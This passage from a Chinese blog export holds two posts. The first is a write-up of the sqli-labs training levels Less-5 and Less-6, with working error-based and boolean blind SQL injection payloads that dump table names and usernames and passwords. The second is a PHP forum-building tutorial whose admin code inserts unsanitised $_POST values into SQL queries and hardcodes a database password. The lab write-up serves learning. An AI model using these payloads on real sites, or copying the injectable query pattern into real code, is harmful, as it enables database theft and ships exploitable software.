查出结果了。。。同理，查其他数据表，把limit条件换一下就🆗了 3、爆数据列(字段) 和爆数据表类似，只是改变了下payload，开始尝试注入 ?id=-1&#39;union select count(*),1, concat(&#39;~&#39;,(select concat(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+ 结果，并没有爆出什么内容。 于是，我仔细考虑了一下，发现当payload的条件where后再多加一个条件table_schema=database()爆出字段内容了。。。 payload ?id=-1&#39;union select count(*),1, concat(&#39;~&#39;,(select concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+ 同理，爆其他字段，改一下limit条件就好了。。。 4、爆数据值 这个与上面比，就稍微有点简单了。直接上payload，开始注入 payload ?id=-1&#39;union select count(*),1, concat(&#39;~&#39;,(select concat(username,0x3a,password) from users limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+ 直接爆出内容了。同理，爆其他数据值同上改limit条件。。 6、Less-6双注入GET双引号字符型注入与上一个实验Less-5双注入GET单引号字符型注入手法上几乎一致！区别在于payload中&#39;单引号改为&quot;双引号。 但我查询了一些大佬的博客，发现了另一种方法。方法如下： 布尔型注入 布尔型注入简称盲注，正确会回显，错误没有回显，以此为依据逐字进行想要的字段或者命名进行猜解爆破；在上面的实验中我们已知：数据库名security表名users字段username password手工注入时可使用例如left((select database()),1)&lt;’s’ 这样的比较排序第几位的二分查找方法快速猜解爆破。 emmmm。。。。好像不太明白left有什么用，查查看。。。查询后了解到如下信息： Sql注入截取字符串常用函数mid()函数 此函数为截取字符串一部分。MID(column_name,start[,length]) 参数 描述 column_name 必需。要提取字符的字段 start 必需。规定开始位置（起始值是 1） length 可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本 例： str=”123456” mid(str,2,1) 结果为2 Sql用例： （1）MID(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。 （2）MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。 substr()函数 Substr()和substring()函数实现的功能是一样的，均为截取字符串。 string substring(string, start, length) string substr(string, start, length) 参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。 Sql用例： (1) substr(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。 (2) substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处string参数可以为sql语句，可自行构造sql语句进行注入。 Left()函数 Left()得到字符串左部指定个数的字符 Left ( string, n ) string为要截取的字符串，n为长度。 Sql用例： (1) left(database(),1)&gt;’a’,查看数据库名第一位，left(database(),2)&gt;’ab’,查看数据库名前二位。 (2) 同样的string可以为自行构造的sql语句。 同时也要介绍ORD()函数，此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用。 例如ORD(MID(DATABASE(),1,1))&gt;114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’ Sql注入截取字符串常用函数原文链接 这些知识了解之后可以愉快的注入了。。。 1、爆数据库 payload1正确并有回显，表的开头排序第一位为s ?id=1&quot; and left((select database()),1)=&#39;s&#39;--+ payload2正确并有回显，表的开头排序第一位不是i，但前面有i ?id=1&quot; and left((select database()),1)&gt;&#39;i&#39;--+ payload3错误并无回显，表的开头排序第一位后面没有i ?id=1&quot; and left((select database()),1)&lt;&#39;i&#39;--+ left((select database()),1)&lt;&#39;s&#39; 中1表示当前有1个字符取开头1个字符来猜测是否存在，这个顺序是前到后，是有顺序的。如果更换为8,那么就表示当前有8个字符取8个字符来猜测是否存在；所以s要改为security刚好8个字符8个排序，8个字符一起对比是正确还是错误。 ?id=1&quot; and left((select database()),8)=&#39;security&#39;--+ 这样，我可以得知表名为security 2、爆数据表 payload1 从limit 的第1个数据第1行数据开始猜解 ?id=1&quot; and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;u&#39; --+ payload2 从limit 从第5条数据取第1条数据开始猜解；limit 4,1 表示第5条数据，程序世界的排序01234 ?id=1&quot; and left((select table_name from information_schema.tables where table_schema=database() limit 4,1),1)=&#39;u&#39; --+ 修改limit x,1和left中的位数限定数字，在第三张表爆破到user表，名为users ?id=1&quot; and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#39;users&#39; --+ 3、爆数据列(字段) 与上面大致是同理的，所以直接上payload ?id=1&quot; and left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 2,1),8)=&#39;password&#39; --+ 4、爆数据值 与上面大致是同理的，所以还是直接上payload ?id=1&quot; and left((select password from users order by id limit 0,1),1)=&#39;d&#39; --+ 使用order by按照id来排序，limit 从0开始到需要的字段.最后爆破到第一个用户的名字dumb，密码dumb，需要注意的是，mysql对大小写不敏感，所以你不知道是Dumb 还是dumb。 布尔型的盲注，全靠猜。。。。。可以写个脚本猜，效率高点。 这篇博客暂且先总结那么多吧。。。。 在错误型和双注入的关卡中，又收获了好多。。继续努力，小白进阶ing。。。。","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"SQL注入","slug":"漏洞原理/SQL注入","permalink":"https://qwzf.github.io/categories/漏洞原理/SQL注入/"}],"tags":[{"name":"GET型联合查询注入","slug":"GET型联合查询注入","permalink":"https://qwzf.github.io/tags/GET型联合查询注入/"},{"name":"GET型双查询注入","slug":"GET型双查询注入","permalink":"https://qwzf.github.io/tags/GET型双查询注入/"},{"name":"靶场练习","slug":"靶场练习","permalink":"https://qwzf.github.io/tags/靶场练习/"}],"author":"qwzf"},{"title":"Web开发-简单BBS论坛","slug":"Web开发-简单BBS论坛","date":"2019-06-05T09:32:32.267Z","updated":"2020-08-01T15:47:00.727Z","comments":true,"path":"2019/06/05/Web开发-简单BBS论坛/","link":"","permalink":"https://qwzf.github.io/2019/06/05/Web开发-简单BBS论坛/","excerpt":"","text":"开发了两周的bbs论坛系统，总算在上周完成了，并且已经把项目文件上传到github上了。[我的bbs]。。。 开发完之后，感觉对sql语句、mysql函数和PHP代码有了深刻的理解。同时了解了开发流程。。好像收获很多耶！！！总结一下吧。。。 大致思路需求 浏览者有浏览任何版块、任何帖子以及任何回复的权限，并且任何浏览者都有注册成为本论坛的用户的权限。 注册用户比浏览者多了发帖，回复帖子的权限，且具有成为某子版块版主的机会 版主比注册用户多出删除本版块帖子和相关回复的权限 管理员具有操作网站后台的权限(比如设置版块、更改站点信息、帖子管理、用户管理等) 功能 数据库设计 1、数据库名称：bbs 2、数据表： (1）father_module父版块表 字段：id、module_name、sort (2）son_module子版块表 字段：id、father_module_id、module_name、info、member_id、sort (3）member会员表 字段：id、username、password、photo、register_name、last_time (4）content帖子表 字段：id、module_id、title、content、time、member_id、times (5）reply帖子回复表 字段：id、content_id、quote_id、content、time、member_id (6）manage管理员表 字段：id、username、password (7) info站点信息 字段：id、title、keywords、description 程序目录结构 admin/：存放后台程序文件 inc/：存放被包含的文件 style/：存放样式、图片 （后台我使用的是css\\、fonts\\和images。存放样式、图片） uploads/：存放上传文件 其他各种文件 开发步骤 前台与后台的界面 后台-父版块 后台-子版块 前台-用户注册 前台-用户发帖 前台-帖子列表页 前台-帖子内容页 前台-帖子回复 前台-首页 前台-用户中心 等等… 开发步骤实现准备因为写总结时，功能已经实现。所以把开发过程中的一些准备，直接都写出来了。 mysql函数库在与admin同级目录inc/里创建一个php文件名为mysql.inc.php。并在文件里写入相关mysql函数。代码【mysql.inc.php】 相关设置同样在与admin同级目录inc/里创建一个php文件名为config.inc.php。里面包括设置时区、开启session、转换编码、设置数据库连接信息和找到绝对路径。代码如下： &lt;?php date_default_timezone_set(&#39;Asia/Shanghai&#39;);//设置时区 session_start(); header(&#39;Content-type:text/html;charset=utf-8&#39;); define(&#39;DB_HOST&#39;,&#39;localhost&#39;); define(&#39;DB_USER&#39;,&#39;root&#39;); define(&#39;DB_PASSWORD&#39;,&#39;199910mm&#39;); define(&#39;DB_DATABASE&#39;,&#39;bbs&#39;); define(&#39;DB_PORT&#39;,3306); //项目（程序），在服务器上的绝对路径 define(&#39;SA_PATH&#39;,dirname(dirname(__FILE__))); //项目在web根目录下面的位置（哪个目录里面） define(&#39;SUB_URL&#39;,str_replace($_SERVER[&#39;DOCUMENT_ROOT&#39;],&#39;&#39;,str_replace(&#39;\\\\&#39;,&#39;/&#39;,SA_PATH)).&#39;/&#39;); ?&gt; 跳转和登录验证直接跳转，执行结果信息不太明确。可以设置跳转结果显示。如图： 于是把该功能写在了php文件tool.inc.php。该文件中也写了会员是否登录验证和管理员是否登录的验证。 代码【tool.inc.php】 后台相关验证为了方便，我将admin目录里的inc/目录里的相关验证写在下面 1.check_father_module.inc.php 2.check_login.inc.php 3.check_manage.inc.php 4.check_son_module.inc.php 5.is_manage_login.inc.php 【相关代码】 后台删除确认页confirm.php【代码地址】 一、前台与后台的界面前台和后台界面可以自己用html和css写，也可以找一些模板。我为了方便，于是找了模板。。。。毕竟是主要为了练习php和sql语句以及mysql函数。 前台界面模板 后台界面模板 后台界面有点不合适，于是把顶部、底部和左侧写在不同文件，把后台界面修改了一下 header.inc.php、sidebar.inc.php和footer.inc.php(都在admin目录里的inc目录里) //header.inc.php &lt;?php $query=&quot;select * from info where id=1&quot;; $result_info=execute($link, $query); $data_info=mysqli_fetch_assoc($result_info); ?&gt; &lt;!doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;?php echo $template[&#39;title&#39;] ?&gt; - &lt;?php echo $data_info[&#39;title&#39;]?&gt;&lt;/title&gt; &lt;meta name=&quot;keywords&quot; content=&quot;&lt;?php echo $data_info[&#39;keywords&#39;]?&gt;&quot; /&gt; &lt;meta name=&quot;description&quot; content=&quot;&lt;?php echo $data_info[&#39;description&#39;]?&gt;&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/common.css&quot;/&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/main.css&quot;/&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;topbar-wrap white&quot;&gt; &lt;div class=&quot;topbar-inner clearfix&quot;&gt; &lt;div class=&quot;topbar-logo-wrap clearfix&quot;&gt; &lt;h1 class=&quot;topbar-logo none&quot;&gt;&lt;a href=&quot;index.html&quot; class=&quot;navbar-brand&quot;&gt;后台管理&lt;/a&gt;&lt;/h1&gt; &lt;ul class=&quot;navbar-list clearfix&quot;&gt; &lt;li&gt;&lt;a class=&quot;on&quot; href=&quot;login.html&quot;&gt;后台首页&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;../index.php&quot; target=&quot;_blank&quot;&gt;网站首页&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div class=&quot;top-info-wrap&quot;&gt; &lt;ul class=&quot;top-info-list clearfix&quot;&gt; &lt;li&gt;管理员&lt;?php echo $_SESSION[&#39;manage&#39;][&#39;username&#39;]?&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;logout.php&quot;&gt;注销&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; //sidebar.inc.php &lt;div class=&quot;container clearfix&quot;&gt; &lt;div class=&quot;sidebar-wrap&quot;&gt; &lt;div class=&quot;sidebar-title&quot;&gt; &lt;h1&gt;菜单&lt;/h1&gt; &lt;/div&gt; &lt;div class=&quot;sidebar-content&quot;&gt; &lt;ul class=&quot;sidebar-list&quot;&gt; &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe018;&lt;/i&gt;系统&lt;/a&gt; &lt;ul class=&quot;sub-menu&quot;&gt; &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe017;&lt;/i&gt;系统信息&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;manage.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe014;&lt;/i&gt;管理员&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;manage_add.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe068;&lt;/i&gt;添加管理员&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;system.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe002;&lt;/i&gt;站点设置&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe009;&lt;/i&gt;内容管理&lt;/a&gt; &lt;ul class=&quot;sub-menu&quot;&gt; &lt;li&gt;&lt;a href=&quot;father_module.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe006;&lt;/i&gt;父版块列表&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;father_module_add.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe005;&lt;/i&gt;添加父版块&lt;/a&gt;&lt;/li&gt; &lt;?php if(basename($_SERVER[&#39;SCRIPT_NAME&#39;])==&#39;father_module_update.php&#39;){ echo &#39;&lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe002;&lt;/i&gt;编辑父板块&lt;/a&gt;&lt;/li&gt;&#39;; } ?&gt; &lt;li&gt;&lt;a href=&quot;son_module.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe006;&lt;/i&gt;子版块列表&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;son_module_add.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe005;&lt;/i&gt;添加子版块&lt;/a&gt;&lt;/li&gt; &lt;?php if(basename($_SERVER[&#39;SCRIPT_NAME&#39;])==&#39;son_module_update.php&#39;){ echo &#39;&lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe002;&lt;/i&gt;编辑子板块&lt;/a&gt;&lt;/li&gt;&#39;; } ?&gt; &lt;li&gt;&lt;a href=&quot;../index.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe012;&lt;/i&gt;帖子管理&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe003;&lt;/i&gt;用户管理&lt;/a&gt; &lt;ul class=&quot;sub-menu&quot;&gt; &lt;li&gt;&lt;a href=&quot;member_list.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe041;&lt;/i&gt;用户列表&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; //footer.inc.php &lt;/body&gt; &lt;/html&gt; 效果 二、后台-父版块父版块列表页 要实现上述效果。 思路首先，引入文件config.inc.php、mysql.inc.php、tool.inc.php、header.inc.php、sidebar.inc.php。 其次，连接数据库、管理员是否登录验证、写出页面标题(在页面顶部文件输出)、执行sql增删改查对father_module数据表信息进行相关操作，在修改、添加版块，引入文件进行输入内容的相关验证(check_father_module.inc.php)。 最后，在以关联数组的方式获取一条记录的数据。在定界符区域内输出id、排序和父版块的名字，以及删除和修改超链接。点击删除，跳转到father_module_delete.php，通过获取的id删除指定版块。 点击修改，跳转到father_module_update.php通过sql语句的增删改查，进行修改。 父版块代码如下： 1.father_module.php &lt;?php include_once &#39;../inc/config.inc.php&#39;; include_once &#39;../inc/mysql.inc.php&#39;; include_once &#39;../inc/tool.inc.php&#39;; $link=connect(); include_once &#39;inc/is_manage_login.inc.php&#39;; $template[&#39;title&#39;]=&#39;父板块列表页&#39;; $query=&quot;select*from father_module&quot;; $result=execute($link,$query); ?&gt; &lt;?php include_once &#39;inc/header.inc.php&#39;;//top include_once &#39;inc/sidebar.inc.php&#39;;//sidebar ?&gt; &lt;div class=&quot;main-wrap&quot;&gt; &lt;div class=&quot;crumb-wrap&quot;&gt; &lt;div class=&quot;crumb-list&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;&lt;a href=&quot;index.php&quot;&gt;后台首页&lt;/a&gt;&lt;span class=&quot;crumb-step&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crumb-name&quot;&gt;父版块列表&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;result-wrap&quot;&gt; &lt;form name=&quot;myform&quot; id=&quot;myform&quot; method=&quot;post&quot;&gt; &lt;div class=&quot;result-title&quot;&gt; &lt;div class=&quot;result-list&quot;&gt; &lt;a href=&quot;father_module_add.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;新增板块&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;result-content&quot;&gt; &lt;table class=&quot;result-tab&quot; width=&quot;100%&quot;&gt; &lt;tr&gt; &lt;th class=&quot;tc&quot; width=&quot;5%&quot;&gt;&lt;input class=&quot;allChoose&quot; name=&quot;&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt; &lt;th&gt;排序&lt;/th&gt; &lt;th&gt;ID&lt;/th&gt; &lt;th&gt;版块名称&lt;/th&gt; &lt;th&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;?php while($data=mysqli_fetch_assoc($result)){ $url=urlencode(&quot;father_module_delete.php?id={$data[&#39;Id&#39;]}&quot;); $return_url=urlencode($_SERVER[&#39;REQUEST_URI&#39;]); $message=&quot;你真的要删除父版块 {$data[&#39;module_name&#39;]} 吗？&quot;; $delete_url=&quot;confirm.php?url={$url}&amp;return_url={$return_url}&amp;message={$message}&quot;; $html=&lt;&lt;&lt;A &lt;tr&gt; &lt;td class=&quot;tc&quot;&gt;&lt;input name=&quot;id[]&quot; value=&quot;59&quot; type=&quot;checkbox&quot;&gt;&lt;/td&gt; &lt;td&gt; &lt;input class=&quot;common-input sort-input&quot; name=&quot;ord[]&quot; value=&quot;{$data[&#39;sort&#39;]}&quot; type=&quot;text&quot;&gt; &lt;/td&gt; &lt;td&gt;{$data[&#39;Id&#39;]}&lt;/td&gt; &lt;td&gt;{$data[&#39;module_name&#39;]}&lt;/td&gt; &lt;td&gt; &lt;a class=&quot;link-update&quot; href=&quot;father_module_update.php?Id={$data[&#39;Id&#39;]}&quot;&gt;[修改]&lt;/a&gt; &lt;a class=&quot;link-del&quot; href=&quot;$delete_url&quot;&gt;[删除]&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; A; echo $html; } ?&gt; &lt;/table&gt; &lt;!--&lt;div class=&quot;list-page&quot;&gt; 2 条 1/1 页&lt;/div&gt;--&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--/main--&gt; &lt;/div&gt; &lt;?php include_once &#39;inc/footer.inc.php&#39;;//footer ?&gt; 2.father_module_delete.php &lt;?php include_once &#39;../inc/config.inc.php&#39;; include_once &#39;../inc/mysql.inc.php&#39;; include_once &#39;../inc/tool.inc.php&#39;; if(!isset($_GET[&#39;id&#39;]) || !is_numeric($_GET[&#39;id&#39;])){ echo&quot;&lt;script type=&#39;text/javascript&#39;&gt;alert(&#39;id参数错误!&#39;);location=&#39;father_module.php&#39;;&lt;/script&gt;&quot;; exit(); } $link=connect(); include_once &#39;inc/is_manage_login.inc.php&#39;; $query=&quot;delete from father_module where id={$_GET[&#39;id&#39;]}&quot;; execute($link,$query); if(mysqli_affected_rows($link)==1){ skip(&#39;father_module.php&#39;,&#39;onCorrect.gif&#39;,&#39;恭喜你删除成功！&#39;); }else{ skip(&#39;father_module.php&#39;,&#39;onError.gif&#39;,&#39;对不起删除失败，请重试！&#39;); } ?&gt; 3.father_module_update.php &lt;?php include_once &#39;../inc/config.inc.php&#39;; include_once &#39;../inc/mysql.inc.php&#39;; include_once &#39;../inc/tool.inc.php&#39;; $link=connect(); include_once &#39;inc/is_manage_login.inc.php&#39;; if(!isset($_GET[&#39;Id&#39;])||!is_numeric($_GET[&#39;Id&#39;])){ skip(&#39;father_module.php&#39;,&#39;onError.gif&#39;,&#39;id参数错误！&#39;); } $query=&quot;select*from father_module where Id={$_GET[&#39;Id&#39;]}&quot;; $result=execute($link,$query); if(!mysqli_num_rows($result)){ skip(&#39;father_module.php&#39;,&#39;onShow.gif&#39;,&#39;这个版块信息不存在！&#39;); } if(isset($_POST[&#39;submit&#39;])){ //验证用户填写的信息 $check_flag=&#39;update&#39;; include &#39;inc/check_father_module.inc.php&#39;; $query=&quot;update father_module set module_name=&#39;{$_POST[&#39;module_name&#39;]}&#39;,sort={$_POST[&#39;sort&#39;]} where Id={$_GET[&#39;Id&#39;]}&quot;; execute($link,$query); if(mysqli_affected_rows($link)==1){ skip(&#39;father_module.php&#39;,&#39;onCorrect.gif&#39;,&#39;修改成功！&#39;); }else{ skip(&#39;father_module.php&#39;,&#39;onError.gif&#39;,&#39;修改失败,请重试！&#39;); } } $data=mysqli_fetch_assoc($result); $template[&#39;title&#39;]=&#39;父板块修改页&#39;; ?&gt; &lt;?php include_once &#39;inc/header.inc.php&#39;;//top include_once &#39;inc/sidebar.inc.php&#39;;//sidebar ?&gt; &lt;div class=&quot;main-wrap&quot;&gt; &lt;div class=&quot;crumb-wrap&quot;&gt; &lt;div class=&quot;crumb-list&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;&lt;a href=&quot;father_module.php&quot;&gt;父版块列表&lt;/a&gt;&lt;span class=&quot;crumb-step&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crumb-name&quot;&gt;修改父版块-&lt;?php echo $data[&#39;module_name&#39;]?&gt;&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;form method=&quot;post&quot;&gt; &lt;div class=&quot;result-content&quot;&gt; &lt;table class=&quot;result-tab&quot; width=&quot;70%&quot;&gt; &lt;tr&gt; &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; name=&quot;&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt; &lt;td&gt;版块名称&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;module_name&quot; class=&quot;common-text&quot; value=&quot;&lt;?php echo $data[&#39;module_name&#39;]?&gt;&quot;/&gt;&lt;/td&gt; &lt;td&gt;版块名称不能为空，最多不超过40个字符&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt; &lt;td&gt;排序&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;sort&quot; class=&quot;common-text&quot; value=&quot;&lt;?php echo $data[&#39;sort&#39;]?&gt;&quot;/&gt;&lt;/td&gt; &lt;td&gt;填入一个数字即可&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;br /&gt; &lt;input class=&quot;btn btn-primary btn6 mr10&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;修改&quot; /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php include_once &#39;inc/footer.inc.php&#39;;//footer ?&gt; 在对父版块的操作中，只有删除和修改是不够的。还应该有父版块添加页father_module_add.php。 4.father_module_add.php &lt;?php include_once &#39;../inc/config.inc.php&#39;; include_once &#39;../inc/mysql.inc.php&#39;; include_once &#39;../inc/tool.inc.php&#39;; $link=connect(); include_once &#39;inc/is_manage_login.inc.php&#39;; if(isset($_POST[&#39;submit&#39;])){ $link=connect(); //验证用户填写的信息 $check_flag=&#39;add&#39;; include &#39;inc/check_father_module.inc.php&#39;; $query=&quot;insert into father_module(module_name,sort) values(&#39;{$_POST[&#39;module_name&#39;]}&#39;,{$_POST[&#39;sort&#39;]})&quot;; execute($link,$query); if(mysqli_affected_rows($link)==1){ skip(&#39;father_module.php&#39;,&#39;onCorrect.gif&#39;,&#39;恭喜你，添加成功！&#39;); }else{ skip(&#39;faher_module_add.php&#39;,&#39;onError.gif&#39;,&#39;对不起，添加失败，请重试！&#39;); } } $template[&#39;title&#39;]=&#39;父版块添加页&#39;; ?&gt; &lt;?php include_once &#39;inc/header.inc.php&#39;;//top include_once &#39;inc/sidebar.inc.php&#39;;//sidebar ?&gt; &lt;div class=&quot;main-wrap&quot;&gt; &lt;div class=&quot;crumb-wrap&quot;&gt; &lt;div class=&quot;crumb-list&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;&lt;a href=&quot;father_module.php&quot;&gt;父板块列表&lt;/a&gt;&lt;span class=&quot;crumb-step&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crumb-name&quot;&gt;添加父版块&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;form method=&quot;post&quot;&gt; &lt;div class=&quot;result-content&quot;&gt; &lt;table class=&quot;result-tab&quot; width=&quot;70%&quot;&gt; &lt;tr&gt; &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; name=&quot;&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt; &lt;td&gt;版块名称&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;module_name&quot; class=&quot;common-text&quot; /&gt;&lt;/td&gt; &lt;td&gt;版块名称不能为空，最多不超过40个字符&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt; &lt;td&gt;排序&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;sort&quot; class=&quot;common-text&quot; /&gt;&lt;/td&gt; &lt;td&gt;填入一个数字即可&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;br /&gt; &lt;input class=&quot;btn btn-primary btn6 mr10&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;添加&quot; /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php include_once &#39;inc/footer.inc.php&#39;;//footer ?&gt; 父版块添加页效果如下： 三、后台-子版块子版块列表页 实现上述效果。除了sql语句操作的数据表(son_module)和输入内容验证文件(check_son_module.inc.php)不同外，其他和父版块类似，可以参考一下父版块的。 代码如下： 1.son_module.php &lt;?php include_once &#39;../inc/config.inc.php&#39;; include_once &#39;../inc/mysql.inc.php&#39;; include_once &#39;../inc/tool.inc.php&#39;; $link=connect(); include_once &#39;inc/is_manage_login.inc.php&#39;; $template[&#39;title&#39;]=&#39;子板块列表页&#39;; $query=&quot;select sm.id,sm.module_name,fm.module_name father_module_name,sm.member_id,sm.sort from son_module sm,father_module fm where sm.father_module_id=fm.id order by fm.id&quot;; $result=execute($link,$query); ?&gt; &lt;?php include_once &#39;inc/header.inc.php&#39;;//top include_once &#39;inc/sidebar.inc.php&#39;;//sidebar ?&gt; &lt;div class=&quot;main-wrap&quot;&gt; &lt;div class=&quot;crumb-wrap&quot;&gt; &lt;div class=&quot;crumb-list&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;&lt;a href=&quot;index.php&quot;&gt;后台首页&lt;/a&gt;&lt;span class=&quot;crumb-step&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crumb-name&quot;&gt;子版块列表&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;result-wrap&quot;&gt; &lt;form name=&quot;myform&quot; id=&quot;myform&quot; method=&quot;post&quot;&gt; &lt;div class=&quot;result-title&quot;&gt; &lt;div class=&quot;result-list&quot;&gt; &lt;a href=&quot;son_module_add.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;新增板块&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;result-content&quot;&gt; &lt;table class=&quot;result-tab&quot; width=&quot;100%&quot;&gt; &lt;tr&gt; &lt;th class=&quot;tc&quot; width=&quot;5%&quot;&gt;&lt;input class=&quot;allChoose&quot; name=&quot;&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt; &lt;th&gt;排序&lt;/th&gt; &lt;th&gt;ID&lt;/th&gt; &lt;th&gt;版块名称&lt;/th&gt; &lt;th&gt;所属父版块&lt;/th&gt; &lt;th&gt;版主&lt;/th&gt; &lt;th&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;?php while($data=mysqli_fetch_assoc($result)){ $url=urlencode(&quot;son_module_delete.php?id={$data[&#39;id&#39;]}&quot;); $return_url=urlencode($_SERVER[&#39;REQUEST_URI&#39;]); $message=&quot;你真的要删除父版块 {$data[&#39;module_name&#39;]} 吗？&quot;; $delete_url=&quot;confirm.php?url={$url}&amp;return_url={$return_url}&amp;message={$message}&quot;; $html=&lt;&lt;&lt;A &lt;tr&gt; &lt;td class=&quot;tc&quot;&gt;&lt;input name=&quot;id[]&quot; value=&quot;59&quot; type=&quot;checkbox&quot;&gt;&lt;/td&gt; &lt;td&gt; 